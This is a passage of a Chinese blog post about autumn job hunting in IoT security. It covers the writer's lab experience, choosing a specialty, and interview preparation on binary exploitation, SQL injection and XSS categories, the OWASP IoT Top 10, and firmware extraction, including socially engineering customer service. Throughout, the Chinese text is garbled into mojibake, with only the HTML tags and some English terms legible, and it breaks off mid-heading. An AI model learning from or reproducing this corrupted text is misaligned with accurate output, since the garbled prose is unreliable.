”é‡åˆ°äº†åé¢ç¼©å‡ï¼Œä¸æ˜¯20%ï¼Œ30%è¿™ç§ç¨‹åº¦çš„ç¼©æ‹›ï¼Œæ˜¯ç›´æ¥æ²¡äº†80%+ã€‚è¢«è¿™ç§æƒ…å†µå“åˆ°çš„æˆ‘èµ¶ç´§è”ç³»äº†ç°åœ¨çš„å®éªŒå®¤ï¼Œåœ¨å‘é€æ„å‘é‚®ä»¶ä¹‹åï¼Œæ„å¤–è¢«å®éªŒå®¤ä¸‰å·¨å¤´+æŸé’¦å®šç»§æ‰¿äººå››äººç¯ç»•æå‰è¿›è¡Œäº†ä¸€æ¬¡å°é¢è¯•ï¼Œé¢è¯•ä¹‹åå¿ƒä¸­é¡¿æ—¶è¸å®äº†ä¸å°‘ã€‚åœ¨å¤è¯•è¿‡åä¸ä¹…ï¼Œç¡®è®¤äº†æ‹Ÿå½•å–é€šè¿‡ï¼Œå¿ƒä¸­çš„ä¸€å—çŸ³å¤´ç»ˆäºè½åœ°ï¼Œæˆ‘è¿˜å¼€å¿ƒäº†å¥½å‡ å¤©ï¼Œä½†è¿™ç§å¿«ä¹å¹¶æ²¡æœ‰æŒç»­å¤šä¹…ã€‚</p><p>ä»å¤§å››æ¯•ä¸šæ¥åˆ°è¿™é‡Œä¹‹åï¼Œé™¤å¼€ç ”ä¸€çŸ­æš‚çš„å¿«ä¹å°±æ˜¯å„ç§æ‚æ´»ï¼Œæœ‰è·Ÿç€å¸ˆå…„åšç”µç½‘åè®®çš„æ–‡æ¡£ï¼Œåšå·¥æ§çš„å¤–åŒ…é¡¹ç›®ï¼Œä¹Ÿæœ‰è¢«å«å»å†™ä¹¦ï¼Œå»æŸéƒ¨é˜Ÿåšæµ‹è¯•ç­‰ã€‚æœ‰ä¸Šé¢çš„è¿™äº›äº‹æƒ…ä¹‹å¤–ï¼Œè¿˜æœ‰å„ç§æ‚ä¸ƒæ‚å…«çš„æ–‡æ¡£ï¼Œæœ€è¦å‘½çš„æ˜¯æ–‡æ¡£è¿˜ä¼šåå¤ä¿®æ”¹ï¼Œå¯¼è‡´æœ€åå˜æˆåŒæ ·çš„å†…å®¹ä¸€ç›´æ”¹æ ¼å¼ï¼Œä¸€ä¼šå„¿æ˜¯è¿™ç§æ’ç‰ˆï¼Œä¸€ä¼šå„¿è¿˜è¦æ¢æˆå¦å¤–ä¸€ç§ï¼Œæœ€ååˆtmæ¢å›å»ï¼›å¦å¤–ä¸€ä¸ªé—®é¢˜æ˜¯è¿™é‡Œç®¡ç†æ··ä¹±ï¼Œæ¯ä¸ªäº‹æƒ…éƒ½æ˜¯ä¸´æ—¶é€šçŸ¥ï¼Œå¿«è¦åˆ°ddlæ‰ä¼šé€šçŸ¥ä½ å»åšï¼Œå…¨ç„¶ä¸ç®¡ä½ é‚£ä¸ªæ—¶é—´æ®µæœ‰æ²¡æœ‰ç©ºã€‚è¯¸å¤šçäº‹æ··æ‚åœ¨ä¸€èµ·ï¼Œè‡ªå·±ä¹ŸæŠ‘éƒè¿‡ä¸€æ®µæ—¶é—´ï¼Œå¥½åœ¨ç ”äºŒæ—¶æ¥è§¦åˆ°Cå¸ˆå…„çš„é¡¹ç›®ï¼Œç»™æˆ‘æŒ‡æ˜äº†ä¸€æ¡é“è·¯ï¼Œè¿™ç®—æ˜¯åœ¨æŸå®éªŒå®¤ä¸­å°‘æ•°èƒ½å­¦åˆ°ä¸œè¥¿çš„é¡¹ç›®äº†ï¼Œä¹Ÿå› ä¸ºæ¥æ‰‹è¿™ä¸ªé¡¹ç›®è®©æˆ‘çš„ç§‹æ‹›ç®€å†æ›´åŠ ä¸°å¯Œã€‚æ‰€ä»¥åœ¨é‡åˆ°è®©ä½ è‹¦æ¼çš„ç¯å¢ƒæ—¶ï¼Œä¹Ÿè¦ç§¯æçš„å»å¯»æ‰¾æœºä¼šã€‚</p><p>å°±ç®—èº«å¤„ç»å¢ƒï¼Œé¢å¯¹æ®‹é…·çš„ç°å®ï¼Œä¹Ÿèƒ½å¤Ÿå¦ç„¶æ¥å—ï¼Œå¹¶ä¸”è¿˜èƒ½é¼“èµ·å‹‡æ°”ï¼Œä¸ä¹‹é¡½å¼ºæ–—äº‰ï¼Œè¿™å°±æ˜¯<strong>é»„é‡‘ç²¾ç¥</strong>ã€‚</p><h2 id="æ–¹å‘é€‰æ‹©"><a href="#æ–¹å‘é€‰æ‹©" class="headerlink" title="æ–¹å‘é€‰æ‹©"></a>æ–¹å‘é€‰æ‹©</h2><p>ç”±äºæˆ‘çš„å®éªŒå®¤æ˜¯åšç‰©è”ç½‘å®‰å…¨æ–¹å‘çš„ï¼Œåœ¨åšçš„å‡ ä¸ªé¡¹ç›®ä¹Ÿéƒ½æ˜¯å’Œè¿™ä¸ªæœ‰æ‰€è”ç³»ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æˆ‘ä¸ªäººååˆ†æ„Ÿå…´è¶£çš„æ–¹å‘ã€‚å…¶æ¬¡ï¼Œç‰©è”ç½‘å®‰å…¨æ˜¯ä¿¡æ¯å®‰å…¨é¢†åŸŸä¸­çš„åé—¨æ–¹å‘ï¼Œç«äº‰ä¸ä¼šç‰¹åˆ«æ¿€çƒˆï¼Œæ¯”è¾ƒé€‚åˆæˆ‘è¿™ç§ä¸­é€”æ¢æ–¹å‘çš„äººã€‚ä½†è¿™ä¸ªæ–¹å‘ä¹Ÿæœ‰ä¸€ç‚¹é—®é¢˜ï¼Œé‚£å°±æ˜¯å²—ä½ç‰¹åˆ«å°‘ï¼Œæœ¬èº«ä¿¡æ¯å®‰å…¨å°±æ˜¯äº’è”ç½‘ä¸­å²—ä½è¾ƒå°‘çš„ä¸€ç±»äº†ï¼Œç‰©è”ç½‘å®‰å…¨åˆæ˜¯ä¿¡æ¯å®‰å…¨ä¸­çš„å°æ–¹å‘ï¼Œé‚£è‡ªç„¶èƒ½é€‰æ‹©çš„å²—ä½å°±æ›´å°‘äº†ã€‚</p><p>ç»“åˆè‡ªèº«å®é™…æƒ…å†µä¹‹åï¼Œæ¯…ç„¶é€‰æ‹©ç‰©è”ç½‘å®‰å…¨æ–¹å‘ä½œä¸ºæˆ‘çš„ç§‹æ‹›æ–¹å‘ã€‚</p><h2 id="é¢è¯•å‡†å¤‡"><a href="#é¢è¯•å‡†å¤‡" class="headerlink" title="é¢è¯•å‡†å¤‡"></a>é¢è¯•å‡†å¤‡</h2><p>ç»“åˆç§‹æ‹›çš„é¢è¯•ï¼Œæ€»ç»“å‡ºé¢è¯•éœ€è¦å‡†å¤‡äº”ä¸ªæ–¹é¢çš„å†…å®¹ï¼Œè¿™äº›å†…å®¹åŒæ ·é€‚ç”¨äºå…¶ä»–çš„ä¿¡æ¯å®‰å…¨æ–¹å‘ã€‚</p><ol><li>å®‰å…¨ç›¸å…³çš„é¡¹ç›®</li><li>æŒ–æ˜/åˆ†æè¿‡çš„æ¼æ´</li><li>å‚åŠ è¿‡çš„å®‰å…¨ç±»æ¯”èµ›</li><li>å®‰å…¨ç›¸å…³çš„çŸ¥è¯†</li><li>å…¶ä»–è®¡ç®—æœºåŸºç¡€</li></ol><p>å…¶ä¸­å‰ä¸‰ä¸ªéƒ¨åˆ†ï¼Œå°½é‡æœ‰è¦æœ‰è‡ªå·±çš„äº®ç‚¹ï¼Œä¸‰ä¸ªä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒå‡ºè‰²å°±èƒ½æ‹¿åˆ°å¤§å¤šæ•°å…¬å¸çš„offerï¼›æœ‰ä¸¤ä¸ªå¾ˆå‡ºè‰²åŸºæœ¬ä¸Šèƒ½æ”¶å‰²æ‰€æœ‰å…¬å¸çš„å®‰å…¨å²—offerï¼Œä¸”æœ‰ä¸€éƒ¨åˆ†spï¼›ä¸‰ä¸ªéƒ½ååˆ†ä¼˜ç§€ï¼Œä½ å°±æ˜¯å¤§ä½¬ï¼Œspå’Œsspæ‹¿åˆ°æ‰‹è½¯ã€‚</p><h3 id="é¡¹ç›®"><a href="#é¡¹ç›®" class="headerlink" title="é¡¹ç›®"></a>é¡¹ç›®</h3><p>å®‰å…¨ç›¸å…³çš„é¡¹ç›®å¤§è‡´åˆ†æˆä¸¤ç§ä¸åŒçš„ç±»å‹ï¼š</p><ul><li>æ”»å‡»ç›¸å…³é¡¹ç›®ï¼ˆæ¼æ´æŒ–æ˜ã€æ¼æ´éªŒè¯ã€æ¼æ´åˆ©ç”¨ç­‰ï¼‰</li><li>é˜²å¾¡ç›¸å…³é¡¹ç›®ï¼ˆå®‰å…¨åŠ å›ºã€æ”»å‡»è¯†åˆ«ã€åé—¨æ£€æµ‹ç­‰ï¼‰</li></ul><p>é¡¹ç›®ä¸­è¦æœ‰ç‰¹è‰²ã€æœ‰äº®ç‚¹çš„åœ°æ–¹ï¼Œæ¯”å¦‚ä½ åšçš„ä¸œè¥¿å’Œè¡Œä¸šä¸­å…¶ä»–çš„å·¥å…·å¯¹æ¯”æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Œè§£å†³äº†ä»€ä¹ˆé—®é¢˜ç­‰ã€‚åœ¨é¡¹ç›®æ·±æŒ–çš„é˜¶æ®µä¸­ï¼Œè‚¯å®šä¹Ÿä¼šé—®ä½ åœ¨é¡¹ç›®ä¸­é‡åˆ°çš„éš¾ç‚¹ï¼Œæœ€åå¦‚ä½•è§£å†³çš„ï¼Œé¡¹ç›®è¿˜å­˜åœ¨ä»€ä¹ˆæ”¹è¿›ç©ºé—´å’Œæ”¹è¿›æ–¹å‘ï¼Œä»¥åŠä¸ºä»€ä¹ˆä¸é‡‡ç”¨å…¶ä»–æ€è·¯ç­‰ç­‰ã€‚</p><p>å¯¹äºé¡¹ç›®çš„ç»†èŠ‚ä¸€å®šè¦çŸ¥æ ¹çŸ¥åº•ï¼Œé¢è¯•çš„è¿‡ç¨‹ä¸­éšæ—¶å¯èƒ½ä¼šé—®é“ä¸€äº›å®ç°çš„æ€è·¯å’Œç»†èŠ‚ï¼Œæ‰€ä»¥åœ¨é¢è¯•ä¹‹å‰ä¸€å®šè¦æŠŠä¹‹å‰åšè¿‡çš„ä¸œè¥¿å†è¿‡ä¸€éã€‚åœ¨è®²é¡¹ç›®çš„æ—¶å€™å¯ä»¥å…ˆç²—ç•¥çš„è®²ï¼Œå¦‚æœé¢è¯•å®˜æœ‰æ„å‘ç»§ç»­æ·±å…¥äº¤æµå†è¯¦ç»†è¯´è¯´ã€‚</p><h3 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h3><p>åœ¨å®‰å…¨ç±»çš„é¢è¯•ä¸­ç»å¸¸ä¼šé—®é“ä½ æŒ–æ˜è¿‡/åˆ†æè¿‡ä»€ä¹ˆæ¼æ´ï¼Œæˆ‘å¹¶ä¸æ˜¯è¿™æ–¹é¢çš„å¤§ç¥ï¼Œå¸¸å¸¸åªèƒ½å›ç­”ä¸€ä¸‹æ›¾ç»å¤ç°è¿‡çš„ä¸€äº›CVEå’Œpwn2ownä¸Šçš„ä¸€äº›æ¼æ´ã€‚åœ¨æŒ–æ˜çœŸå®ç›®æ ‡ä¸Šï¼ŒåªæŒ–è¿‡ä¸€äº›è·¯ç”±å™¨è®¾å¤‡ï¼Œè¿™äº›è®¾å¤‡æ•´ä½“æ€è·¯æ¯”è¾ƒç®€å•ï¼Œä¸€èˆ¬æ˜¯æ”»å‡»é¢åˆ†æï¼Œæ‰¾åˆ°å…³é”®ç½‘ç»œæœåŠ¡è¿›è¡Œåˆ†æï¼Œç ”ç©¶å¯¹åº”æœåŠ¡çš„äºŒè¿›åˆ¶ç¨‹åºï¼›å…¶æ¬¡æ˜¯webæ¥å£ä¸Šçš„åŠŸèƒ½ç‚¹é—®é¢˜ï¼Œæœ‰å¯èƒ½å¯¼è‡´xsså’Œå‘½ä»¤æ³¨å…¥ç­‰é—®é¢˜ã€‚</p><h3 id="æ¯”èµ›"><a href="#æ¯”èµ›" class="headerlink" title="æ¯”èµ›"></a>æ¯”èµ›</h3><p>å®‰å…¨ç±»çš„æ¯”èµ›é€šå¸¸æœ‰å››ç§ï¼š</p><ul><li>CTFï¼ˆè§£é¢˜ã€æ”»é˜²ã€æˆ˜äº‰åˆ†äº«ã€äº’ç›¸å‡ºé¢˜æ¥åšã€‘ï¼‰</li><li>æ¸—é€åŒä¸€å¥—ç¯å¢ƒï¼Œå„ä¸ªé˜Ÿä¼ç¯å¢ƒæ˜¯éš”ç¦»çš„</li><li>RealWorldæ¯”èµ›</li><li>CGCç±»çš„æœºå™¨äººæ”»é˜²èµ›</li></ul><p>å¤§å¤šæ•°äººéƒ½æ˜¯æ‰“CTFï¼Œä½†éšç€CTFè¶Šæ¥è¶Šæ­£è§„ï¼Œæ•´ä½“éš¾åº¦ç›´çº¿ä¸Šå‡ï¼Œéœ€è¦é€‰æ‰‹æœ‰å¿«é€Ÿå­¦ä¹ å’Œå¿«é€Ÿä¿¡æ¯æ£€ç´¢çš„èƒ½åŠ›ï¼Œå¹³æ—¶çš„çŸ¥è¯†ç§¯ç´¯ä¹ŸåŒæ ·é‡è¦ï¼Œå¥ˆä½•è‡ªå·±å¤ªèœå¹³æ—¶ç»ƒé¢˜ä¹Ÿå°‘ï¼ŒCTFæ²¡æœ‰ä»€ä¹ˆæˆç»©ï¼ˆå“­å”§å”§ï¼‰ã€‚å¦‚æœæƒ³åœ¨ç«èµ›ä¸­è·å¾—ä¸€å®šçš„åæ¬¡ï¼Œå»ºè®®å…ˆä»å°æ¯”èµ›å¼€å§‹å…¥æ‰‹ï¼Œè¿™æ ·ä¼šæœ‰ä¸€å®šçš„æˆå°±æ„Ÿï¼Œå¤§å‹çš„æ¯”èµ›ä¾‹å¦‚TCTFè¿™ç§ï¼Œå¯ä»¥å°½åŠ›å»åšç­‰èµ›åå»å¤ç°å…¶ä¸­çš„é¢˜ç›®ã€‚</p><p>å…¶ä»–å‡ ç§ç±»å‹æ¯”èµ›ï¼Œæ¸—é€çš„ç±»å‹é€‚åˆä¸“é—¨åšwebå’Œå†…ç½‘çš„åŒå­¦å»å‚åŠ ï¼ŒCGCç±»æ¯”èµ›é€šå¸¸æ˜¯å®éªŒå®¤ç»„å›¢å‚åŠ ï¼ˆæ²¡å®éªŒå®¤æ”¯æŒï¼Œå•é ä¸ªäººå¾ˆéš¾æœ‰å¥½çš„åæ¬¡ï¼‰ï¼ŒRealWorldå°±ç•™ç»™å¤§ä½¬ä»¬å»ç§€äº†ï¼Œå„å¤§å®‰å…¨å…¬å¸è¿˜æœ‰å„é«˜æ ¡ç ”ç©¶æœºæ„çš„å¤§ä½¬ä»¬çš„èˆå°ã€‚</p><h3 id="å®‰å…¨çŸ¥è¯†"><a href="#å®‰å…¨çŸ¥è¯†" class="headerlink" title="å®‰å…¨çŸ¥è¯†"></a>å®‰å…¨çŸ¥è¯†</h3><p>å®‰å…¨æ–¹å‘å¤šç§å¤šæ ·ï¼Œæ¯ä¸€ç§æ–¹å‘æ‰€éœ€è¦å‡†å¤‡çš„ä¸œè¥¿éƒ½ä¸å°½ç›¸åŒï¼Œè¿™é‡Œåªåˆ—ä¸¾ç‰©è”ç½‘å®‰å…¨å’Œè½¯ä»¶å®‰å…¨æ–¹å‘è¦å‡†å¤‡çš„å†…å®¹ã€‚</p><h4 id="äºŒè¿›åˆ¶ç±»çš„å®‰å…¨"><a href="#äºŒè¿›åˆ¶ç±»çš„å®‰å…¨" class="headerlink" title="äºŒè¿›åˆ¶ç±»çš„å®‰å…¨"></a>äºŒè¿›åˆ¶ç±»çš„å®‰å…¨</h4><p><strong>å·¥å…·</strong></p><p>IDAã€GDBã€Ghidraç­‰ï¼Œæœ€å¥½äº†è§£IDAå’ŒGDBçš„åŸºæœ¬åŸç†ï¼Œæ¯”å¦‚IDAæ˜¯é€’å½’ä¸‹é™åˆ†æç®—æ³•ï¼ŒGDBæ˜¯çº¿æ€§æ‰«æåˆ†æã€‚GDBçš„è°ƒè¯•åŸç†ï¼ŒattachåŸç†ç­‰ã€‚è¦æŒæ¡ä¸€å®šç¨‹åº¦çš„IDAå’ŒGDBè„šæœ¬ï¼Œèƒ½ç¼–å†™å°è„šæœ¬è¾…åŠ©åˆ†æã€‚</p><p><strong>æ¼æ´åˆ†æ</strong></p><p>å­¦ä¹ æ¼æ´åˆ†ææ–‡ç« å¹¶å¤ç°å†å²æ¼æ´ï¼Œå¯ä»¥è®©ä½ å­¦ä¹ åˆ°æ¼æ´çš„å‘ç°ï¼Œè°ƒè¯•åˆ°æœ€ååˆ©ç”¨æ•´ä¸ªæµç¨‹ã€‚æ“ä½œä¸€éä¸‹æ¥èƒ½å­¦åˆ°å¾ˆå¤šæ–‡ç« é‡Œæ²¡æœ‰çš„ç»†èŠ‚ç‚¹ï¼Œè€Œä¸”èƒ½åŠ æ·±ä½ å­¦åˆ°çš„å†…å®¹ã€‚é¢è¯•çš„æ—¶å€™ä¹Ÿæœ‰å¾ˆå¤§æ¦‚ç‡ä¼šé—®ä½ åˆ†æè¿‡ä»€ä¹ˆæ ·çš„æ¼æ´ï¼Œä»¥åŠå¦‚ä½•åˆ†æçš„ã€‚</p><p><strong>æ¼æ´æŒ–æ˜</strong></p><p>åœ¨æˆ‘ä»¬æ‹¿åˆ°ç›®æ ‡è®¾å¤‡æˆ–è½¯ä»¶æ—¶ï¼Œå¦‚ä½•åˆ†æå®ƒçš„æ”»å‡»é¢ï¼Œåˆæœ‰å“ªäº›å®¹æ˜“æ”»å‡»çš„ç‚¹ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¦çŸ¥é“æˆ‘ä»¬çš„ç›®æ ‡èƒ½æä¾›å“ªäº›åŠŸèƒ½ï¼Œè€Œè¿™äº›åŠŸèƒ½åˆå­˜åœ¨ç€å“ªäº›éšæ‚£ã€‚åªæœ‰äº†è§£ç›®æ ‡ï¼Œæ‰èƒ½æ›´å¥½çš„å»æŒ–æ˜ç›®æ ‡ä¸­çš„æ¼æ´ã€‚è¿™äº›å¯ä»¥å‚è€ƒç›®æ ‡çš„å†å²æ¼æ´ï¼Œä»ä¸­èƒ½çŸ¥æ™“ç›®æ ‡å“ªä¸ªæ¨¡å—å®¹æ˜“å‡ºç°é—®é¢˜ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨</strong></p><p>æ¯”è¾ƒåŸºç¡€çš„æ¼æ´åˆ©ç”¨åŒ…æ‹¬Linuxå¹³å°ä¸‹çš„ç”¨æˆ·æ€æ ˆæº¢å‡ºï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå †ç›¸å…³çš„æ¼æ´åˆ©ç”¨ã€‚åœ¨IoTé‡Œé¢è¿˜éœ€è¦æŒæ¡å…¶ä»–æ¶æ„çš„åˆ©ç”¨ï¼ˆARMã€MIPSç­‰ï¼‰ï¼Œä½†æ€»ä½“ä¸Šçš„æ€è·¯å’Œx86æ˜¯ç±»ä¼¼çš„ã€‚å…¶æ¬¡ï¼Œæœ€å¥½æœ‰å¯¹çœŸå®è®¾å¤‡æˆ–ç¨‹åºçš„æ¼æ´åˆ©ç”¨ç»éªŒï¼Œä¸CTFä¸åŒçœŸå®ç¯å¢ƒä¸‹çš„æ¼æ´åˆ©ç”¨å¾€å¾€æœ‰å…¶ä»–çš„å¹²æ‰°å› ç´ ï¼Œæ¯”å¦‚æŸäº›è·¯ç”±å™¨çš„webæœåŠ¡æœ‰åŠ¨æ€è®¤è¯ï¼Œè¿˜éœ€è¦ç»•è¿‡è®¤è¯æ‰èƒ½è§¦å‘æ¼æ´ã€‚</p><p>é™¤äº†IoTï¼Œè¿˜æœ‰å…¶ä»–çš„çƒ­é—¨ç›®æ ‡ï¼Œå„ç§æµè§ˆå™¨ï¼Œå„ç§æ–‡ä»¶è§£æå™¨ï¼ˆwordã€excelã€pptã€pdfé˜…è¯»å™¨ã€å›¾ç‰‡æŸ¥çœ‹è½¯ä»¶ç­‰ï¼‰ï¼Œå„ç§å†…æ ¸ç­‰ç­‰ã€‚ï¼ˆå¸Œæœ›ä»¥åæˆ‘ä¹Ÿèƒ½æŒ–è¿™äº› 5555ï¼‰</p><p><strong>é˜²å¾¡æœºåˆ¶åŠå…¶ç»•è¿‡</strong></p><p>ç†Ÿæ‚‰å„ç§é˜²å¾¡æœºåˆ¶ï¼ŒåŒ…æ‹¬ï¼šå †æ ˆä¸å¯æ‰§è¡Œï¼ˆNXï¼‰ã€åœ°å€éšæœºåŒ–ï¼ˆASLRï¼‰ã€æ ˆcookieï¼ˆcanaryï¼‰ç­‰ã€‚çŸ¥é“è¿™äº›æœºåˆ¶çš„ä½œç”¨å’ŒåŸç†ï¼Œèƒ½é™åˆ¶å“ªäº›æ”»å‡»ï¼Œåˆæœ‰ä»€ä¹ˆç»•è¿‡çš„æ–¹æ³•ï¼Œè¿˜èƒ½æ€ä¹ˆæ”¹è¿›é˜²å¾¡ã€‚</p><h4 id="webç±»çš„å®‰å…¨"><a href="#webç±»çš„å®‰å…¨" class="headerlink" title="webç±»çš„å®‰å…¨"></a>webç±»çš„å®‰å…¨</h4><p>ç”±äºç‰©è”ç½‘çš„ç‰¹ç‚¹ï¼Œé‡Œé¢è¿˜æ˜¯æœ‰éƒ¨åˆ†webå®‰å…¨çš„å†…å®¹éœ€è¦æŒæ¡å­¦ä¹ ã€‚</p><p><strong>webæ¼æ´åˆ©ç”¨</strong></p><p>SQLæ³¨å…¥çš„å‡ ç§åŸºæœ¬ç±»å‹éƒ½è¦äº†è§£æŒæ¡ï¼Œæœ‰è¾“å‡ºçš„ï¼Œæœ‰æŠ¥é”™çš„ï¼Œæ²¡æœ‰è¾“å‡ºç›²æ³¨çš„ï¼Œèƒ½å¤ŸäºŒæ¬¡æ³¨å…¥çš„ï¼Œå¸¦å¤–ä¼ è¾“æ•°æ®ç­‰ç­‰ã€‚å­˜åœ¨å±é™©å­—ç¬¦è¿‡æ»¤çš„æƒ…å†µæ€ä¹ˆè¿›è¡Œç»•è¿‡ï¼Œæœ‰ä¸€äº›åŸºæœ¬çš„æ›¿æ¢æ€è·¯ã€‚é™¤äº†åŸºæœ¬çš„selectæ³¨å…¥çš„æƒ…å†µï¼Œè¿˜æœ‰å…¶ä»–å‡ ç±»ï¼Œinsert/updateæ³¨å…¥ï¼Œorder byæ³¨å…¥ç­‰ã€‚</p><p>XSSä¸‰ç§ç±»å‹ï¼Œåå°„ï¼Œå­˜å‚¨ï¼Œdomå…¨çœ‹ä¸€éäº†è§£æŒæ¡åŸºæœ¬çš„ä¸€äº›æƒ…å†µå³å¯ï¼Œç‰©è”ç½‘è®¾å¤‡ä¸­çš„XSSéƒ½æ˜¯ä¸€äº›å¾ˆç®€å•çš„æƒ…å†µã€‚</p><p><strong>webæ¼æ´é˜²å¾¡</strong></p><p>é’ˆå¯¹SQLæ³¨å…¥çš„é˜²å¾¡ï¼Œé€šå¸¸çœ‹åœºæ™¯ï¼Œä¸€èˆ¬ç”¨é»‘åå•ï¼Œé¢„ç¼–è¯‘ï¼Œè½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ç­‰æ–¹æ³•ã€‚é’ˆå¯¹XSSæ”»å‡»çš„é˜²å¾¡ä¹ŸåŒæ ·è¦çœ‹åœºæ™¯ï¼Œæœ‰ç”¨çº¯å‰ç«¯æ¸²æŸ“ï¼Œè½¬ä¹‰HTMLï¼Œå¼€å¯cspä¿æŠ¤ç­‰ç­‰ã€‚</p><h4 id="IoTç‰¹è‰²"><a href="#IoTç‰¹è‰²" class="headerlink" title="IoTç‰¹è‰²"></a>IoTç‰¹è‰²</h4><p><strong>å‚è€ƒOWASP TOP10</strong></p><ol><li>å¼±å¯†ç æˆ–è€…ç¡¬ç¼–ç å¯†ç </li><li>ä¸å®‰å…¨çš„ç½‘ç»œæœåŠ¡</li><li>ä¸å®‰å…¨çš„ç³»ç»Ÿæ¥å£</li><li>ç¼ºå°‘å®‰å…¨çš„å‡çº§æœºåˆ¶ï¼ˆå¯¹å›ºä»¶æ²¡æœ‰checkï¼Œç¼ºå°‘å¯¹å›æ»šçš„ä¿æŠ¤ã€‚ã€‚ã€‚ï¼‰</li><li>ä½¿ç”¨ä¸å®‰å…¨çš„/è¿‡æœŸçš„ç»„ä»¶</li><li>ä¸å……åˆ†çš„éšç§ä¿æŠ¤</li><li>ä¸å®‰å…¨çš„æ•°æ®ä¼ è¾“å’Œå­˜å‚¨</li><li>ç¼ºå°‘è®¾å¤‡ç®¡ç†</li><li>ä¸å®‰å…¨çš„é»˜è®¤è®¾ç½®</li><li>ç¼ºå°‘ç‰©ç†åŠ å›º</li></ol><p><a href="https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project" target="_blank" rel="noopener">https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project</a></p><p><strong>IoTç›¸å…³å·¥å…·ä½¿ç”¨</strong></p><p>çƒ§å½•å¤¹ï¼Œç¼–ç¨‹å™¨ï¼Œçƒ­é£æªï¼Œç”µæ´›é“ï¼Œä¸‡ç”¨è¡¨ç­‰å·¥å…·ã€‚çƒ§å½•å¤¹æœ‰äº›æ—¶å€™èƒ½ç›´æ¥è¯»å–åˆ°flashèŠ¯ç‰‡ä¸­çš„å›ºä»¶æ•°æ®ï¼Œåœ¨è·å–ä¸åˆ°çš„æƒ…å†µä¸‹å¯ä»¥ç”¨çƒ­é£æªæŠŠèŠ¯ç‰‡æ‹†ä¸‹æ¥æ”¾è¿›ç¼–ç¨‹å™¨ä¸­è¯»å–ã€‚ç”µæ´›é“æŠŠæ‹†ä¸‹æ¥çš„èŠ¯ç‰‡å†æ¬¡ç„Šæ¥å›å»ï¼Œæ¨èä½¿ç”¨æ’æ¸©ç”µæ´›é“ï¼Œé‚£ç§ä¾¿æ·æ€§çš„ç”¨ç€ä¸æ–¹ä¾¿ã€‚ä¸‡ç”¨è¡¨å¯ä»¥ç¡®å®šæ¿å­ä¸Šçš„ä¸²å£ä½ç½®ï¼Œæ–¹ä¾¿æˆ‘ä»¬åç»­çš„è°ƒè¯•æˆ–è€…dumpå›ºä»¶ã€‚</p><p><strong>å›ºä»¶æå–æ–¹æ³•</strong></p><ol><li>å®˜ç½‘ä¸‹è½½</li><li>æ‰¾å®¢æœç¤¾å·¥</li><li>å‡çº§æ—¶æŠ“åŒ…ï¼Œçœ‹ä¸‹è½½é“¾æ¥</li><li>ç”¨çƒ§å½•å¤¹ç›´æ¥è¯»flashèŠ¯ç‰‡ï¼Œæœ‰ä¸€å®šæ¦‚ç‡èƒ½è¯»å‡ºæ¥</li><li>æ‹†flashèŠ¯ç‰‡ï¼Œåœ¨ç¼–ç¨‹å™¨ä¸­è¯»</li><li>æ‰¾æ¿å­ä¸Šçš„è°ƒè¯•æ¥å£ï¼Œè¿ä¸Šå»ä¹‹ådumpå†…å­˜</li><li>åœ¨ç½‘ä¸Šå•†åº—æœ‰ä¸€å®šæ¦‚ç‡èƒ½è´­ä¹°åˆ°</li></ol><h3 id="é€šç”¨åŸºç¡€çŸ¥è¯†"><a href="#é€šç”¨åŸºç¡€çŸ¥è¯†" class="headerlink" title="é€šç”¨åŸºç¡€çŸ¥è¯†"></a>é€šç”¨åŸºç¡€çŸ¥è¯†</h3><h4 id="æ“…é•¿çš„ç¼–ç¨‹è¯­è¨€"><a href="#æ“…é•¿çš„ç¼–ç¨‹è¯­è¨€" class="headerlink" title="æ“…é•¿çš„ç¼–ç¨‹è¯­è¨€"></a>æ“…é•¿çš„ç¼–ç¨‹è¯­è¨€</h4><p>é¢è¯•ä¸­æœ‰å¯èƒ½ä¼šé—®åŠæ“…é•¿çš„ç¼–ç¨‹è¯­è¨€ï¼Œæˆ‘è§‰å¾—ç¨‹åºå‘˜è‡³å°‘è¦ç†Ÿæ‚‰ä¸¤é—¨è¯­è¨€ï¼Œä¸€ä¸ªç¼–è¯‘è¯­è¨€+ä¸€ä¸ªè„šæœ¬è¯­è¨€ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯C+Pythonçš„ç»„åˆã€‚è¿™ä¸ªæ—¶å€™é¢è¯•å®˜ä¼šé—®è¿™äº›è¯­è¨€ç›¸å…³çš„é—®é¢˜ï¼Œæ¯”å¦‚Cè¯­è¨€ä¸­staticä¼šç”¨åœ¨å“ªé‡Œï¼ŒPythonä¸­çš„å†…å­˜ç®¡ç†æœºåˆ¶ã€‚</p><h4 id="ç¼–ç¨‹èƒ½åŠ›"><a href="#ç¼–ç¨‹èƒ½åŠ›" class="headerlink" title="ç¼–ç¨‹èƒ½åŠ›"></a>ç¼–ç¨‹èƒ½åŠ›</h4><p>å®‰å…¨ç±»çš„å²—ä½ç°åœ¨æ™®éä¸å†éœ€è¦è€ƒç®—æ³•é¢˜ï¼Œä½†ä»ç„¶æœ‰ä¸€éƒ¨åˆ†å…¬å¸ä¼šè€ƒå¯Ÿï¼Œæ¯”å¦‚ï¼šå­—èŠ‚ã€åä¸ºã€vivoã€‚æ‰€ä»¥åˆ·ä¸€åˆ·åŸºç¡€å’Œä¸­ç­‰éš¾åº¦çš„ç®—æ³•é¢˜è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚æˆ‘æ˜¯ç”¨çš„codetopå¹³å°æ¥åˆ·ä¸€äº›çƒ­é—¨ç®—æ³•é¢˜ï¼Œå†å­¦ä¹ labuladongçš„ç®—æ³•å°æŠ„æ¥åŠ æ·±å¯¹ç®—æ³•çš„ç†è§£ã€‚ç¼–ç¨‹è¯­è¨€é€‰æ‹©è‡ªå·±æœ€ç†Ÿæ‚‰çš„å³å¯ï¼Œæ²¡å¿…è¦å¼ºè¿«è‡ªå·±é€‰Javaã€‚</p><h2 id="é¢ç»æ±‡æ€»"><a href="#é¢ç»æ±‡æ€»" class="headerlink" 